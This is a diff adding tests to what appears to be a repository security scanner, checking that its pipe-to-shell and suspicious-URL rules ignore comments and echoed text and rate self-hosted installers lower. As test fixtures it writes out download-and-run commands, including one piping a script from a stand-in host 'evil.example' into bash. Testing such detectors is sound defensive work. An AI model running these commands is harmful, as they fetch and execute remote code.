@@ -18,9 +18,11 @@ import {
     repoFindings,
     repoNeeds,
     reverseShell,
+    runnableView,
     scanCommand,
     scanFile,
     scanRepo,
+    scanText,
     setupPy,
     setupPyDependencies,
     shift,
@@ -176,6 +178,41 @@ describe("text rules", () => {
         expect(downloadRun("curl -o a.sh https://x.dev/a && bash a.sh", code)[0]?.id).toBe(
             "download_run",
         );
+    });
+
+    it("ignores comment lines and echoed text in scripts for contextual rules", () => {
+        const docker = [
+            "#!/bin/sh",
+            "# wrapped up in a function so that we have some protection against only getting",
+            '# half the file during "curl | sh"',
+            "  // curl https://get.example.dev/x | sh",
+            'echo "Run: curl -fsSL https://get.example.dev/install | bash"',
+            "printf '%s\\n' \"curl https://45.9.12.3/x | sh\"",
+            "do_install",
+        ].join("\n");
+        expect(pipeToShell(runnableView(docker), code)).toEqual([]);
+        expect(suspiciousUrls(runnableView(docker), code)).toEqual([]);
+        expect(ids(scanText(docker, code))).toEqual([]);
+        for (const live of [
+            'echo "curl https://get.example.dev/x" | sh',
+            'echo "$(curl -fsSL https://get.example.dev/x | sh)"',
+            "curl https://get.example.dev/x | sh # install",
+        ]) {
+            expect(ids(scanText(live, code))).toContain("pipe_to_shell");
+        }
+        expect(ids(scanText("# curl https://get.example.dev/x | sh", docs))).toEqual([
+            "pipe_to_shell",
+        ]);
+        expect(runnableView(docker)).toHaveLength(docker.length);
+    });
+
+    it("rates a script fetching more of its own installer low", () => {
+        const bun = 'powershell -c "irm bun.sh/install.ps1|iex"';
+        const own = { ...code, selfHost: "bun.sh" };
+        expect(pipeToShell(bun, own)).toMatchObject([{ severity: "low" }]);
+        expect(pipeToShell(bun, code)).toMatchObject([{ severity: "medium" }]);
+        const other = "curl -fsSL https://evil.example/x | bash";
+        expect(pipeToShell(other, own)).toMatchObject([{ severity: "medium" }]);
     });
 
     it("hidden_whitespace flags code after a long blank run but not in docs", () => {
